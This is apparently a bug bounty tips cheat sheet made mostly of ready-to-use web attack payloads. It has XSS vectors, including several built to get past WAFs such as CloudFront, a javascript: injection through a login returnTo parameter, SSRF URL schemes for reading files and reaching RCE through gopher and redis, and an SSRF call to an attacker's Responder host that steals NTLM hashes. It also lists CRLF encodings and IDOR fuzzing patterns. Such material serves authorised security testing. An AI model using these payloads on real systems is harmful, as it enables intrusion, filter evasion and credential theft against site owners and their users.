# General tips
changing Exif metadata of an image can lead to XSS, RCE ...  [learn more](https://gokulvinesh.medium.com/rce-xss-via-image-exif-metadata-dddf33dadb41).
# XSS
1-The new reportError() function enables a quite amusing XSS vector:
```
window.name='alert(1)'
reportError(name , enerror=eval)
```
2-If you see `returnTo=` in login url , add `javascript:alert(1)` and login > xss alert.<br>
3-Amazon CloudFront WAF sometimes can be easily bypassed with `<svg onload=(alert)(1)` instead of `<svg onload=alert(1)`<br>
4-Bypass Waf <br>
```
<details%0Aopen%0AonToGgle%0A=%0Aabc=(co\u006efirm);abc%28%60xss%60%26%2300000000000000000041//
```
5-Bypass XSS WAF protection using a comment between a JS function name and parameters
```
<img/src/onerror=alert/*1337*/(1)>
<img/src/onerror=alert//&NewLine;(2)>
<img/src/onerror=alert&sol;**&sol;(3)>
```
<br>
6-Bypass XSS WAF protection using Whitespace Separators between a JS function name and parameters <br>

```
<img/src/onerror=alert&#xFEFF;(1337)>
```
![ ](https://raw.githubusercontent.com/rbih-boulanouar/bugbounty/main/Whitespace%20Separators.jpeg)

# SSRF
1-Try other URL schemes:<br>
```
• file:// (file read)
• netdoc:// (file read)
• dict://
• gopher://
• jar://
• ldap://
• and more!
```
<br>
You might be able to get file read.
<br>
Or send multi-line requests to gain additional impact
<br>
(Ex: gopher + redis = likely RCE)
<br>
2-Is the target running Windows?

Can't hit internal services?

(Well, try this even if you can)

Try to steal NTLM hashes with Responder.<br>

`/vulnerable?url=http://your-responder-host`
# Rate limit bypass
![ ](https://raw.githubusercontent.com/rbih-boulanouar/bugbounty/main/Rate%20limit%20bypass.jpeg)
# Line terminators
For XSS / CRLF injection.<br>
🔹LF: %0A (\u000A)<br>
🔹VT: %0B (\u000B)<br>
🔹FF: %0C (\u000C)<br>
🔹CR: %0D (\u000D)<br>
🔹CR+LF: %0D%0A (\u000D\u000A)<br>
🔹NEL: %C2%85 (\u0085)<br>
🔹LS: %E2%80%A8 (\u2028)<br>
🔹PS: %E2%80%A9 (\u2029)<br>
# IDOR:
1-<br>
```
/api/getUser$FUZZ$
-> /api/getUserv1
-> /api/getUserBeta
```
